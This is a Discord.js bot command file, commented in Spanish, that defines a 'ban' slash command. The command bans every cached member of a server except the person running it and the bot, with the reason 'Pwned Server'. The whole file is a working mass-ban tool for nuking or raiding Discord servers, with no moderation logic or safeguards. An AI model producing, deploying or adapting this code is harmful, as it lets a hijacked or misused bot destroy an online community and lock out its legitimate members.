const { ChatInputCommandInteraction, SlashCommandBuilder } = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("ban")
        .setDescription("Banea a todos"),
    /**
     * 
     * @param {ChatInputCommandInteraction} interaction
     */
    async execute(interaction) {

        // Filtrar al usuario que ejecuta el comando y al bot
        const membersToBan = interaction.guild.members.cache.filter(m => m.id !== interaction.user.id && m.id !== interaction.client.user.id);

        for (const [, member] of membersToBan) {
            try {
                console.log(member)
                await member.ban({ reason: "Pwned Server", });
               
        
            } catch (error) {
                console.error(`No se pudo prohibir a ${member.user.tag}:`, error);
           
            }
        }
        await interaction.channel.send("...")
    },
};